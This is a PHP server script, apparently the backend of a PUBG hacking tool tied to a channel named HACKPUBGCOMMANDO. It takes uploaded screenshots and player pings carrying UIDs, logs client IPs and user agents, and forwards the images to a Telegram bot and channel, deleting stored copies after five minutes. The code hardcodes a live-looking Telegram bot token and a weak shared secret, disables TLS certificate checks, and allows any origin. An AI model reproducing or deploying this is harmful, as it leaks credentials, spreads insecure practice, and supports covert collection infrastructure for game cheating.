<?php
/**
 * PUBG AutoFeedback Server — PHP 8.2
 * File: feedback.php
 * Multi-Recipient: Chat + Channel
 * Auto-delete images after 5 minutes
 */

// ═══════════════════════════════════════════
// 🔧 الإعدادات
// ═══════════════════════════════════════════
define('TELEGRAM_BOT_TOKEN', '8703023530:AAE1X84ZcS43B8viTuLgyrewKeuNSNe5aAg');
define('API_SECRET_KEY', 'MySecretKey2024');

// ✅ قائمة المستلمين — الشات الخاص + القناة
$TELEGRAM_RECIPIENTS = [
    '5181525855',           // 📱 الشات الخاص
    '-1001928936647',       // 📢 القناة @HACKPUBGCOMMANDO
];

// ✅ إعدادات المسح التلقائي — 5 دقائق
define('KEEP_IMAGES_SECONDS', 300);   // 5 دقائق
define('MAX_IMAGES_KEEP', 100);       // حد أقصى 100 صورة

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET');
header('Access-Control-Allow-Headers: Content-Type');

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// ═══════════════════════════════════════════
// 📊 Logging Setup
// ═══════════════════════════════════════════
define('DATA_DIR', __DIR__ . '/logs_data');
define('IMG_DIR', DATA_DIR . '/images');
define('LOG_FILE', DATA_DIR . '/received.log');
@mkdir(DATA_DIR, 0755, true);
@mkdir(IMG_DIR, 0755, true);

// ═══════════════════════════════════════════
// 🧹 Auto Cleanup — امسح الصور الأقدم من 5 دقائق
// ═══════════════════════════════════════════
function autoCleanup() {
    $cutoff = time() - KEEP_IMAGES_SECONDS;
    $deleted = 0;
    
    foreach (glob(IMG_DIR . '/*.jpg') as $f) {
        if (filemtime($f) < $cutoff) {
            if (@unlink($f)) $deleted++;
        }
    }
    
    // حد أقصى 100 صورة
    $images = glob(IMG_DIR . '/*.jpg');
    if (count($images) > MAX_IMAGES_KEEP) {
        usort($images, function($a, $b) { return filemtime($a) - filemtime($b); });
        foreach (array_slice($images, 0, count($images) - MAX_IMAGES_KEEP) as $f) {
            if (@unlink($f)) $deleted++;
        }
    }
    
    return $deleted;
}

// شغل المسح مع كل طلب
@autoCleanup();

function logRequest($type, $caption, $imageData = '', $extraInfo = '') {
    $logFile = DATA_DIR . '/received.log';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $time = date('Y-m-d H:i:s');
    $size = strlen($imageData);
    
    $line = sprintf(
        "[%s] [%s] IP=%s | Size=%d B | UA=%s | Caption=%s %s",
        $time,
        $type,
        $ip,
        $size,
        substr($ua, 0, 40),
        substr(preg_replace('/\s+/', ' ', strip_tags($caption)), 0, 80),
        $extraInfo
    );
    
    @file_put_contents($logFile, $line . "\n", FILE_APPEND | LOCK_EX);
    
    // احفظ الصورة (للمونيتور) — حد 5MB
    if ($size > 0 && $size <= 5 * 1024 * 1024 && !empty($imageData)) {
        $hash = substr(md5($imageData), 0, 12);
        $imgFile = IMG_DIR . '/' . date('Ymd_His') . '_' . $hash . '.jpg';
        @file_put_contents($imgFile, $imageData);
    }
}

// ═══════════════════════════════════════════
// 📤 إرسال الصورة لـ Telegram — multi-recipient
// ═══════════════════════════════════════════
function sendPhotoToTelegram($imageData, $caption = '') {
    global $TELEGRAM_RECIPIENTS;
    
    if (strpos($imageData, 'data:image') === 0) {
        $imageData = preg_replace('#^data:image/\w+;base64,#i', '', $imageData);
        $imageData = base64_decode($imageData);
    }
    
    $tmpFile = sys_get_temp_dir() . '/tg_' . uniqid() . '.jpg';
    file_put_contents($tmpFile, $imageData);
    
    $results = [];
    $successCount = 0;
    $lastError = '';
    $sentTo = [];
    
    foreach ($TELEGRAM_RECIPIENTS as $chatId) {
        $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendPhoto';
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => $caption,
            'parse_mode' => 'HTML',
            'photo' => new CURLFile($tmpFile, 'image/jpeg', 'screenshot.jpg')
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        $results[$chatId] = [
            'http_code' => $httpCode,
            'ok' => ($httpCode === 200)
        ];
        
        if ($httpCode === 200) {
            $successCount++;
            $sentTo[] = $chatId;
        } else {
            $lastError = $error . ' | ' . substr($response ?? '', 0, 200);
        }
    }
    
    @unlink($tmpFile);
    
    return [
        'success' => ($successCount > 0),
        'sent_count' => $successCount,
        'total' => count($TELEGRAM_RECIPIENTS),
        'sent_to' => $sentTo,
        'http_code' => ($successCount > 0) ? 200 : 500,
        'response' => json_encode($results),
        'error' => $lastError
    ];
}

// ═══════════════════════════════════════════
// GET — فحص السيرفر
// ═══════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_GET['ping'])) {
    $stats = [
        'total_requests' => file_exists(LOG_FILE) ? count(file(LOG_FILE)) : 0,
        'total_images' => count(glob(IMG_DIR . '/*.jpg')),
    ];
    echo json_encode([
        'status' => true,
        'service' => 'PUBG AutoFeedback',
        'time' => date('Y-m-d H:i:s'),
        'php_version' => PHP_VERSION,
        'stats' => $stats,
        'recipients' => count($GLOBALS['TELEGRAM_RECIPIENTS']),
        'cleanup_mode' => 'Delete after ' . KEEP_IMAGES_SECONDS . 's',
        'monitor' => '/monitor.php'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

// ═══════════════════════════════════════════
// 📡 PING — إشارة الدخول
// ═══════════════════════════════════════════
if (isset($_POST['ping']) || isset($_GET['ping'])) {
    $secret = $_POST['secret'] ?? $_GET['secret'] ?? '';
    if ($secret !== API_SECRET_KEY) {
        echo json_encode(['status' => false, 'error' => 'Unauthorized']);
        exit;
    }
    
    $uid = $_POST['uid'] ?? $_GET['uid'] ?? 'unknown';
    $map = $_POST['map'] ?? $_GET['map'] ?? 'unknown';
    $kills = $_POST['kills'] ?? $_GET['kills'] ?? '0';
    $from = $_POST['from'] ?? $_GET['from'] ?? '';
    $stage = $_POST['stage'] ?? $_GET['stage'] ?? '';
    
    $extra = "ping=true";
    if ($from) $extra .= " from=$from";
    if ($stage) $extra .= " stage=$stage";
    
    logRequest('PING', "🎮 Player entered match | UID=$uid | Map=$map | Kills=$kills", '', $extra);
    
    echo json_encode([
        'status' => true,
        'message' => 'ping received',
        'server_time' => date('Y-m-d H:i:s'),
        'uid' => $uid,
        'monitor' => '/monitor.php'
    ]);
    exit;
}

// ═══════════════════════════════════════════
// POST — استقبال الصورة
// ═══════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['status' => false, 'error' => 'Method not allowed']);
    exit;
}

$secret = $_POST['secret'] ?? $_GET['secret'] ?? '';
if ($secret !== API_SECRET_KEY) {
    logRequest('UNAUTHORIZED', 'Wrong secret: ' . substr($secret, 0, 20), '', '');
    echo json_encode(['status' => false, 'error' => 'Unauthorized']);
    exit;
}

$imageData = null;
$caption = $_POST['caption'] ?? '📸 PUBG Screenshot';

if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
    $imageData = file_get_contents($_FILES['photo']['tmp_name']);
}
elseif (!empty($_POST['base64_image'])) {
    $imageData = base64_decode($_POST['base64_image']);
    if ($imageData === false) {
        $imageData = base64_decode(urldecode($_POST['base64_image']));
    }
}
elseif (!empty($_GET['base64_image'])) {
    $imageData = base64_decode($_GET['base64_image']);
}
else {
    $rawBody = file_get_contents('php://input');
    $json = json_decode($rawBody, true);
    if ($json && isset($json['base64_image'])) {
        $imageData = base64_decode($json['base64_image']);
        $caption = $json['caption'] ?? $caption;
    }
    elseif (strlen($rawBody) > 100) {
        $imageData = $rawBody;
    }
}

if (empty($imageData)) {
    logRequest('NO_IMAGE', $caption, '', 'received: ' . implode(',', array_keys($_POST)));
    echo json_encode([
        'status' => false,
        'error' => 'No image received',
        'received_keys' => array_keys($_POST)
    ]);
    exit;
}

if (strlen($imageData) > 10 * 1024 * 1024) {
    logRequest('TOO_LARGE', $caption, '', 'size: ' . strlen($imageData));
    echo json_encode(['status' => false, 'error' => 'Image too large']);
    exit;
}

// 📊 سجل الطلب
$from = $_POST['from'] ?? $_GET['from'] ?? 'unknown';
$stage = $_POST['stage'] ?? $_GET['stage'] ?? 'unknown';
$session = $_POST['session'] ?? $_GET['session'] ?? 'none';

$reqType = 'OTHER';
if (stripos($caption, 'ENTRY') !== false) $reqType = 'ENTRY';
elseif (stripos($caption, 'WIN') !== false || stripos($caption, 'TOP 1') !== false) $reqType = 'WIN';
elseif ($stage == 'ping' || stripos($caption, 'PING') !== false) $reqType = 'PING';
elseif (stripos($caption, 'DIAGNOSTIC') !== false) $reqType = 'DIAG';

logRequest($reqType, $caption, $imageData, "from=$from stage=$stage session=$session");

// 3. إرسال لـ Telegram
$result = sendPhotoToTelegram($imageData, $caption);

// ═══════════════════════════════════════════
// 🧹 إعادة تشغيل المسح بعد الإرسال
// ═══════════════════════════════════════════
$cleanedAfterSend = 0;
if ($result['success']) {
    $cleanedAfterSend = @autoCleanup();
}

// 4. الرد
if ($result['success']) {
    echo json_encode([
        'status' => true,
        'message' => 'Sent to Telegram',
        'size' => strlen($imageData),
        'sent_count' => $result['sent_count'],
        'total' => $result['total'],
        'sent_to' => $result['sent_to'],
        'cleaned' => $cleanedAfterSend,
        'monitor' => '/monitor.php'
    ], JSON_UNESCAPED_UNICODE);
} else {
    echo json_encode([
        'status' => false,
        'error' => 'Telegram failed',
        'http_code' => $result['http_code'],
        'details' => substr($result['error'] ?? '', 0, 300)
    ]);
}